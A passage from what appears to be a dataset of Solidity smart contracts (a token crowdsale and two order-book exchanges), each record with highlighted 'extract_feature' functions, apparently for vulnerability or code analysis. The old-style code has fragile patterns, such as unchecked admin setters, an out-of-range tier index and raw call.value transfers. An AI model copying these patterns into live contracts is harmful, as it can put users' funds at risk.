uint256) public contributions;\n mapping(address => uint256) public investorCaps;\n address[] public investors;\n address[] public founders;\n address[] public advisors;\n VestingTrustee public trustee;\n address public reserveWallet;\n struct Tier {\n uint256 rate;\n uint256 max;\n }\n uint public privateSaleTokensAvailable;\n uint public privateSaleTokensSold = 0;\n uint public publicTokensAvailable;\n uint8 public totalTiers = 0;\n bool public tiersInitialized = false;\n uint256 public maxTiers = 6;\n Tier[6] public tiers;\n event TokenPurchase(address indexed purchaser, uint256 value, uint256 amount);\n enum Stage { Preparing, Presale, PresaleFinished, PublicSale, Success, Finalized }\n function Crowdsale(\n uint256 _presaleStartTime,\n uint256 _presaleDuration,\n uint256 _presaleRate,\n uint256 _presaleCap,\n address erc20Token,\n address _wallet,\n uint8 _tiers,\n uint256 _cap,\n address _reserveWallet)\n public\n Presale(_presaleStartTime, _presaleDuration, _presaleRate, _presaleCap)\n {\n require(_wallet != address(0));\n require(erc20Token != address(0));\n require(_tiers > 0 && _tiers <= maxTiers);\n require(_cap > 0);\n require(_reserveWallet != address(0));\n token = MiniMeToken(erc20Token);\n wallet = _wallet;\n totalTiers = _tiers;\n cap = _cap;\n reserveWallet = _reserveWallet;\n trustee = new VestingTrustee(erc20Token);\n maxTokens = 1000000000 * (10 ** 18);\n privateSaleTokensAvailable = maxTokens.mul(22).div(100);\n publicTokensAvailable = maxTokens.mul(28).div(100);\n super.addAddressToWhitelist(msg.sender);\n }\n function() public payable {\n buyTokens(msg.sender, msg.value);\n }\n function getStage() public constant returns(Stage) {\n if (finalized) return Stage.Finalized;\n if (!tiersInitialized || !Presale.hasStarted()) return Stage.Preparing;\n if (!Presale.hasEnded()) return Stage.Presale;\n if (Presale.hasEnded() && !hasStarted()) return Stage.PresaleFinished;\n if (!hasEnded()) return Stage.PublicSale;\n if (hasEnded()) return Stage.Success;\n return Stage.Preparing;\n }\n modifier inStage(Stage _stage) {\n require(getStage() == _stage);\n _;\n }\n function initTiers(uint256[] rates, uint256[] totalWeis) public onlyWhitelisted returns(uint256) {\n require(token.controller() == address(this));\n require(!tiersInitialized);\n require(rates.length == totalTiers && rates.length == totalWeis.length);\n uint256 tierMax = 0;\n for (uint8 i=0; i < totalTiers; i++) {\n require(totalWeis[i] > 0 && rates[i] > 0);\n tierMax = tierMax.add(totalWeis[i]);\n tiers[i] = Tier({\n rate: rates[i],\n max: tierMax\n });\n }\n require(tierMax == cap);\n tiersInitialized = true;\n return tierMax;\n }\n function setCapForParticipants(address[] participants, uint256[] caps) onlyWhitelisted public {\n require(participants.length <= 50 && participants.length == caps.length);\n for (uint8 i=0; i < participants.length; i++) {\n investorCaps[participants[i]] = caps[i];\n }\n }\n function addGrant(address assignee, uint256 value, bool isFounder) public onlyWhitelisted whenNotPaused {\n require(value > 0);\n require(assignee != address(0));\n uint256 start;\n uint256 cliff;\n uint256 vestingPercentage;\n uint256 initialTokens;\n if(isFounder) {\n start = now;\n cliff = start + 12*30 days;\n vestingPercentage = 20;\n founders.push(assignee);\n }\n else {\n initialTokens = value.mul(10).div(100);\n transferTokens(assignee, initialTokens);\n start = now;\n cliff = start + 6*30 days;\n vestingPercentage = 15;\n advisors.push(assignee);\n }\n uint256 end = now + 3 * 1 years;\n uint256 installmentLength = 6 * 30 days;\n bool revokable = true;\n transferTokens(trustee, value.sub(initialTokens));\n trustee.grant(assignee, value, start, cliff, end, installmentLength, vestingPercentage, initialTokens, revokable);\n }\n function finalize() public onlyWhitelisted inStage(Stage.Success) {\n require(!finalized);\n trustee.transferOwnership(msg.sender);\n token.enableTransfers(true);\n uint256 unsold = maxTokens.sub(token.totalSupply());\n transferTokens(reserveWallet, unsold);\n token.changeController(0x0);\n finalized = true;\n }\n function startPublicSale(uint _startTime, uint _duration) public onlyWhitelisted inStage(Stage.PresaleFinished) {\n require(_startTime >= now);\n require(_duration > 0);\n startTime = _startTime;\n endTime = _startTime + _duration * 1 days;\n publicSaleInitialized = true;\n }\n function totalWei() public constant returns(uint256) {\n uint256 presaleWei = super.totalWei();\n return presaleWei.add(weiRaised);\n }\n function totalPublicSaleWei() public constant returns(uint256) {\n return weiRaised;\n }\n function totalCap() public constant returns(uint256) {\n uint256 presaleCap = super.totalCap();\n return presaleCap.add(cap);\n }\n function totalTokens() public constant returns(uint256) {\n return tokensSold;\n }\n function buyTokens(address purchaser, uint256 value) internal whenNotPaused returns(uint256) {\n require(value > 0);\n Stage stage = getStage();\n require(stage == Stage.Presale || stage == Stage.PublicSale);\n uint256 purchaseAmount = Math.min256(value, investorCaps[purchaser].sub(contributions[purchaser]));\n require(purchaseAmount > 0);\n uint256 numTokens;\n if (stage == Stage.Presale) {\n if (Presale.totalWei().add(purchaseAmount) > Presale.totalCap()) {\n purchaseAmount = Presale.capRemaining();\n }\n numTokens = Presale.buyTokens(purchaser, purchaseAmount);\n } else if (stage == Stage.PublicSale) {\n uint totalWei = weiRaised.add(purchaseAmount);\n uint8 currentTier = getTier(weiRaised);\n if (totalWei >= cap) {\n totalWei = cap;\n purchaseAmount = cap.sub(weiRaised);\n }\n if (totalWei <= tiers[currentTier].max) {\n numTokens = purchaseAmount.mul(tiers[currentTier].rate);\n } else {\n uint remaining = tiers[currentTier].max.sub(weiRaised);\n numTokens = remaining.mul(tiers[currentTier].rate);\n uint256 excess = totalWei.sub(tiers[currentTier].max);\n numTokens = numTokens.add(excess.mul(tiers[currentTier + 1].rate));\n }\n weiRaised = weiRaised.add(purchaseAmount);\n }\n require(tokensSold.add(numTokens) <= publicTokensAvailable);\n tokensSold = tokensSold.add(numTokens);\n forwardFunds(purchaser, purchaseAmount);\n transferTokens(purchaser, numTokens);\n if (value.sub(purchaseAmount) > 0) {\n msg.sender.transfer(value.sub(purchaseAmount));\n }\n TokenPurchase(purchaser, numTokens, purchaseAmount);\n return numTokens;\n }\n function forwardFunds(address purchaser, uint256 value) internal {\n if (contributions[purchaser] == 0) {\n investors.push(purchaser);\n }\n contributions[purchaser] = contributions[purchaser].add(value);\n wallet.transfer(value);\n }\n function changeEndTime(uint _endTime) public onlyWhitelisted {\n endTime = _endTime;\n }\n function changeFundsWallet(address _newWallet) public onlyWhitelisted {\n require(_newWallet != address(0));\n wallet = _newWallet;\n }\n function changeTokenController() onlyWhitelisted public {\n token.changeController(msg.sender);\n }\n function changeTrusteeOwner() onlyWhitelisted public {\n trustee.transferOwnership(msg.sender);\n }\n function changeReserveWallet(address _reserve) public onlyWhitelisted {\n require(_reserve != address(0));\n reserveWallet = _reserve;\n }\n function setWhitelistAddress(address _whitelist) public onlyWhitelisted {\n require(_whitelist != address(0));\n whitelistAddress = _whitelist;\n }\n function transferTokens(address to, uint256 value) internal {\n token.generateTokens(to, value);\n }\n function sendPrivateSaleTokens(address to, uint256 value) public whenNotPaused onlyWhitelisted {\n require(privateSaleTokensSold.add(value) <= privateSaleTokensAvailable);\n privateSaleTokensSold = privateSaleTokensSold.add(value);\n transferTokens(to, value);\n }\n function hasEnded() internal constant returns(bool) {\n return now > endTime || weiRaised >= cap;\n }\n function hasStarted() internal constant returns(bool) {\n return publicSaleInitialized && now >= startTime;\n }\n function getTier(uint256 _weiRaised) internal constant returns(uint8) {\n for (uint8 i = 0; i < totalTiers; i++) {\n if (_weiRaised < tiers[i].max) {\n return i;\n }\n }\n return totalTiers + 1;\n }\n function getCurrentTier() public constant returns(uint8) {\n return getTier(weiRaised);\n }\n function proxyPayment(address _owner) public payable returns(bool) {\n return true;\n }\n function onApprove(address _owner, address _spender, uint _amount) public returns(bool) {\n return true;\n }\n function onTransfer(address _from, address _to, uint _amount) public returns(bool) {\n return true;\n }\n function getTokenSaleTime() public constant returns(uint256, uint256) {\n return (startTime, endTime);\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b79"
  },
  "filename": "3311.sol",
  "content": "pragma solidity ^0.4.9;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function assert(bool assertion) internal {\n if (!assertion) throw;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n uint public decimals;\n string public name;\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping(address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ReserveToken is StandardToken, SafeMath {\n address public minter;\n function ReserveToken() {\n minter = msg.sender;\n }\n function create(address account, uint amount) {\n if (msg.sender != minter) throw;\n balances[account] = safeAdd(balances[account], amount);\n totalSupply = safeAdd(totalSupply, amount);\n }\n function destroy(address account, uint amount) {\n if (msg.sender != minter) throw;\n if (balances[account] < amount) throw;\n balances[account] = safeSub(balances[account], amount);\n totalSupply = safeSub(totalSupply, amount);\n }\n}\ncontract AccountLevels {\n function accountLevel(address user) constant returns(uint) {}\n}\ncontract AccountLevelsTest is AccountLevels {\n mapping (address => uint) public accountLevels;\n function setAccountLevel(address user, uint level) {\n accountLevels[user] = level;\n }\n function accountLevel(address user) constant returns(uint) {\n return accountLevels[user];\n }\n}\ncontract nDEX is SafeMath {\n address public admin;\n address public feeAccount;\n address public feeAccount2;\n address public accountLevelsAddr;\n uint public feeMake;\n uint public feeTake;\n uint public feeRebate;\n mapping (address => mapping (address => uint)) public tokens;\n mapping (address => mapping (bytes32 => bool)) public orders;\n mapping (address => mapping (bytes32 => uint)) public orderFills;\n event Order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user);\n event Cancel(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s);\n event Trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address get, address give);\n event Deposit(address token, address user, uint amount, uint balance);\n event Withdraw(address token, address user, uint amount, uint balance);\n function nDEX(address admin_, address feeAccount_, address feeAccount2_, address accountLevelsAddr_, uint feeMake_, uint feeTake_, uint feeRebate_) {\n admin = admin_;\n feeAccount = feeAccount_;\n feeAccount2 = feeAccount2_;\n accountLevelsAddr = accountLevelsAddr_;\n feeMake = feeMake_;\n feeTake = feeTake_;\n feeRebate = feeRebate_;\n }\n function() {\n throw;\n }\n function changeAdmin(address admin_) {\n if (msg.sender != admin) throw;\n admin = admin_;\n }\n function changeAccountLevelsAddr(address accountLevelsAddr_) {\n if (msg.sender != admin) throw;\n accountLevelsAddr = accountLevelsAddr_;\n }\n function changeFeeAccount(address feeAccount_) {\n if (msg.sender != admin) throw;\n feeAccount = feeAccount_;\n }\n function changeFeeAccount2(address feeAccount2_) {\n if (msg.sender != feeAccount2) throw;\n feeAccount2 = feeAccount2_;\n }\n function changeFeeMake(uint feeMake_) {\n if (msg.sender != admin) throw;\n if (feeMake_ > feeMake) throw;\n feeMake = feeMake_;\n }\n function changeFeeTake(uint feeTake_) {\n if (msg.sender != admin) throw;\n if (feeTake_ > feeTake || feeTake_ < feeRebate) throw;\n feeTake = feeTake_;\n }\n function changeFeeRebate(uint feeRebate_) {\n if (msg.sender != admin) throw;\n if (feeRebate_ < feeRebate || feeRebate_ > feeTake) throw;\n feeRebate = feeRebate_;\n }\n function deposit() payable {\n tokens[0][msg.sender] = safeAdd(tokens[0][msg.sender], msg.value);\n Deposit(0, msg.sender, msg.value, tokens[0][msg.sender]);\n }\n function withdraw(uint amount) {\n if (tokens[0][msg.sender] < amount) throw;\n tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);\n if (!msg.sender.call.value(amount)()) throw;\n Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);\n }\n function depositToken(address token, uint amount) {\n if (token==0) throw;\n if (!Token(token).transferFrom(msg.sender, this, amount)) throw;\n tokens[token][msg.sender] = safeAdd(tokens[token][msg.sender], amount);\n Deposit(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function withdrawToken(address token, uint amount) {\n if (token==0) throw;\n if (tokens[token][msg.sender] < amount) throw;\n tokens[token][msg.sender] = safeSub(tokens[token][msg.sender], amount);\n if (!Token(token).transfer(msg.sender, amount)) throw;\n Withdraw(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function balanceOf(address token, address user) constant returns (uint) {\n return tokens[token][user];\n }\n function order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n orders[msg.sender][hash] = true;\n Order(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender);\n }\n function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(\n (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\n block.number <= expires &&\n safeAdd(orderFills[user][hash], amount) <= amountGet\n )) throw;\n tradeBalances(tokenGet, amountGet, tokenGive, amountGive, user, amount);\n orderFills[user][hash] = safeAdd(orderFills[user][hash], amount);\n Trade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender);\n }\n function tradeBalances(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address user, uint amount) private {\n uint feeMakeXfer = safeMul(amount, feeMake) / (1 ether);\n uint feeTakeXfer = safeMul(amount, feeTake) / (1 ether);\n uint feeRebateXfer = 0;\n if (accountLevelsAddr != 0x0) {\n uint accountLevel = AccountLevels(accountLevelsAddr).accountLevel(user);\n if (accountLevel==1) feeRebateXfer = safeMul(amount, feeRebate) / (1 ether);\n if (accountLevel==2) feeRebateXfer = feeTakeXfer;\n }\n tokens[tokenGet][msg.sender] = safeSub(tokens[tokenGet][msg.sender], safeAdd(amount, feeTakeXfer));\n tokens[tokenGet][user] = safeAdd(tokens[tokenGet][user], safeSub(safeAdd(amount, feeRebateXfer), feeMakeXfer));\n uint fee = safeSub(safeAdd(feeMakeXfer, feeTakeXfer), feeRebateXfer);\n uint fee2 = safeMul(fee, 20) / 100;\n tokens[tokenGet][feeAccount] = safeAdd(tokens[tokenGet][feeAccount], safeSub(fee, fee2));\n tokens[tokenGet][feeAccount2] = safeAdd(tokens[tokenGet][feeAccount2], fee2);\n tokens[tokenGive][user] = safeSub(tokens[tokenGive][user], safeMul(amountGive, amount) / amountGet);\n tokens[tokenGive][msg.sender] = safeAdd(tokens[tokenGive][msg.sender], safeMul(amountGive, amount) / amountGet);\n }\n function testTrade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount, address sender) constant returns(bool) {\n if (!(\n tokens[tokenGet][sender] >= amount &&\n availableVolume(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, user, v, r, s) >= amount\n )) return false;\n return true;\n }\n function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(\n (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\n block.number <= expires\n )) return 0;\n uint available1 = safeSub(amountGet, orderFills[user][hash]);\n uint available2 = safeMul(tokens[tokenGive][user], amountGet) / amountGive;\n if (available1<available2) return available1;\n return available2;\n }\n function amountFilled(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n return orderFills[user][hash];\n }\n function cancelOrder(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, uint8 v, bytes32 r, bytes32 s) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(orders[msg.sender][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == msg.sender)) throw;\n orderFills[msg.sender][hash] = amountGet;\n Cancel(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender, v, r, s);\n }\n}",
  "extract_feature": [
    "function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) {\nbytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\nif (!(\n(orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\nblock.number <= expires &&\nsafeAdd(orderFills[user][hash], amount) <= amountGet\n)) throw;\ntradeBalances(tokenGet, amountGet, tokenGive, amountGive, user, amount);\norderFills[user][hash] = safeAdd(orderFills[user][hash], amount);\nTrade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender);\n}",
    "function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\nbytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\nif (!(\n(orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\nblock.number <= expires\n)) return 0;\nuint available1 = safeSub(amountGet, orderFills[user][hash]);\nuint available2 = safeMul(tokens[tokenGive][user], amountGet) / amountGive;\nif (available1<available2) return available1;\nreturn available2;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b7a"
  },
  "filename": "3337.sol",
  "content": "pragma solidity ^0.4.20;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n}\ncontract Token {\n function totalSupply() constant public returns (uint256 supply) {}\n function balanceOf(address _owner) constant public returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) public returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}\n function approve(address _spender, uint256 _value) public returns (bool success) {}\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n uint public decimals;\n string public name;\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping(address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ReserveToken is StandardToken, SafeMath {\n address public minter;\n function ReserveToken() public {\n minter = msg.sender;\n }\n function create(address account, uint amount) public {\n if (msg.sender != minter) revert();\n balances[account] = safeAdd(balances[account], amount);\n totalSupply = safeAdd(totalSupply, amount);\n }\n function destroy(address account, uint amount) public {\n if (msg.sender != minter) revert();\n if (balances[account] < amount) revert();\n balances[account] = safeSub(balances[account], amount);\n totalSupply = safeSub(totalSupply, amount);\n }\n}\ncontract AccountLevels {\n function accountLevel(address user) constant public returns(uint) {}\n}\ncontract AccountLevelsTest is AccountLevels {\n mapping (address => uint) public accountLevels;\n function setAccountLevel(address user, uint level) public {\n accountLevels[user] = level;\n }\n function accountLevel(address user) constant public returns(uint) {\n return accountLevels[user];\n }\n}\ncontract PolarisDEX is SafeMath {\n address public admin;\n address public feeAccount;\n address public accountLevelsAddr;\n uint public feeMake;\n uint public feeTake;\n uint public feeRebate;\n mapping (address => mapping (address => uint)) public tokens;\n mapping (address => mapping (bytes32 => bool)) public orders;\n mapping (address => mapping (bytes32 => uint)) public orderFills;\n event Order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user);\n event Cancel(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s);\n event Trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address get, address give);\n event Deposit(address token, address user, uint amount, uint balance);\n event Withdraw(address token, address user, uint amount, uint balance);\n function PolarisDEX(address admin_, address feeAccount_, address accountLevelsAddr_, uint feeMake_, uint feeTake_, uint feeRebate_) public {\n admin = admin_;\n feeAccount = feeAccount_;\n accountLevelsAddr = accountLevelsAddr_;\n feeMake = feeMake_;\n feeTake = feeTake_;\n feeRebate = feeRebate_;\n }\n function () public {\n revert();\n }\n function changeAdmin(address admin_) public {\n if (msg.sender != admin) revert();\n admin = admin_;\n }\n function changeAccountLevelsAddr(address accountLevelsAddr_) public {\n if (msg.sender != admin) revert();\n accountLevelsAddr = accountLevelsAddr_;\n }\n function changeFeeAccount(address feeAccount_) public {\n if (msg.sender != admin) revert();\n feeAccount = feeAccount_;\n }\n function changeFeeMake(uint feeMake_) public {\n if (msg.sender != admin) revert();\n if (feeMake_ > feeMake) revert();\n feeMake = feeMake_;\n }\n function changeFeeTake(uint feeTake_) public {\n if (msg.sender != admin) revert();\n if (feeTake_ > feeTake || feeTake_ < feeRebate) revert();\n feeTake = feeTake_;\n }\n function changeFeeRebate(uint feeRebate_) public {\n if (msg.sender != admin) revert();\n if (feeRebate_ < feeRebate || feeRebate_ > feeTake) revert();\n feeRebate = feeRebate_;\n }\n function deposit() payable public {\n tokens[0][msg.sender] = safeAdd(tokens[0][msg.sender], msg.value);\n emit Deposit(0, msg.sender, msg.value, tokens[0][msg.sender]);\n }\n function withdraw(uint amount) public {\n if (tokens[0][msg.sender] < amount) revert();\n tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);\n if (!msg.sender.call.value(amount)()) revert();\n emit Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);\n }\n function depositToken(address token, uint amount) public {\n if (token==0) revert();\n if (!Token(token).transferFrom(msg.sender, this, amount)) revert();\n tokens[token][msg.sender] = safeAdd(tokens[token][msg.sender], amount);\n emit Deposit(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function withdrawToken(address token, uint amount) public {\n if (token==0) revert();\n if (tokens[token][msg.sender] < amount) revert();\n tokens[token][msg.sender] = safeSub(tokens[token][msg.sender], amount);\n if (!Token(token).transfer(msg.sender, amount)) revert();\n emit Withdraw(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function balanceOf(address token, address user) constant public returns (uint) {\n return tokens[token][user];\n }\n function order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce) public {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n orders[msg.sender][hash] = true;\n emit Order(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender);\n }\n function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) public {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(\n (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\n block.number <= expires &&\n safeAdd(orderFills[user][hash], amount) <= amountGet\n )) revert();\n tradeBalances(tokenGet, amountGet, tokenGive, amountGive, user, amount);\n orderFills[user][hash] = safeAdd(orderFills[user][hash], amount);\n emit Trade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender);\n }\n function tradeBalances(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address user, uint amount) private {\n uint feeMakeXfer = safeMul(amount, feeMake) / (1 ether);\n uint feeTakeXfer = safeMul(amount, feeTake) / (1 ether);\n uint feeRebateXfer = 0;\n if (accountLevelsAddr != 0x0) {\n uint accountLevel = AccountLevels(accountLevelsAddr).accountLevel(user);\n if (accountLevel==1) feeRebateXfer = safeMul(amount, feeRebate) / (1 ether);\n if (accountLevel==2) feeRebateXfer = feeTakeXfer;\n }\n tokens[tokenGet][msg.sender] = safeSub(tokens[tokenGet][msg.sender], safeAdd(amount, feeTakeXfer));\n tokens[tokenGet][user] = safeAdd(tokens[tokenGet][user], safeSub(safeAdd(amount, feeRebateXfer), feeMakeXfer));\n tokens[tokenGet][feeAccount] = safeAdd(tokens[tokenGet][feeAccount], safeSub(safeAdd(feeMakeXfer, feeTakeXfer), feeRebateXfer));\n tokens[tokenGive][user] = safeSub(tokens[tokenGive][user], safeMul(amountGive, amount) / amountGet);\n tokens[tokenGive][msg.sender] = safeAdd(tokens[tokenGive][msg.sender], safeMul(amountGive, amount) / amountGet);\n }\n function testTrade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount, address sender) constant public returns(bool) {\n if (!(\n tokens[tokenGet][sender] >= amount &&\n availableVolume(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, user, v, r, s) >= amount\n )) return false;\n return true;\n }\n function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant public returns(uint) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(\n (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\n block.number <= expires\n )) return 0;\n uint available1 = safeSub(amountGet, orderFills[user][hash]);\n uint available2 = safeMul(tokens[tokenGive][user], amountGet) / amountGive;\n if (available1<available2) return available1;\n return available2;\n }\n function amountFilled(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant public returns(uint) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n return orderFills[user][hash];\n }\n function cancelOrder(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, uint8 v, bytes32 r, bytes32 s) public {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(orders[msg.sender][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == msg.sender)) revert();\n orderFills[msg.sender][hash] = amountGet;\n emit Cancel(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender, v, r, s);\n }\n}",
  "extract_feature": [
    "function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) public {\nbytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\nif (!(\n(orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\nblock.number <= expires &&\nsafeAdd(orderFills[user][hash], amount) <= amountGet\n)) revert();\ntradeBalances(tokenGet, amountGet, tokenGive, amountGive, user, amount);\norderFills[user][hash] = safeAdd(orderFills[user][hash], amount);\nemit Trade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender);\n}",
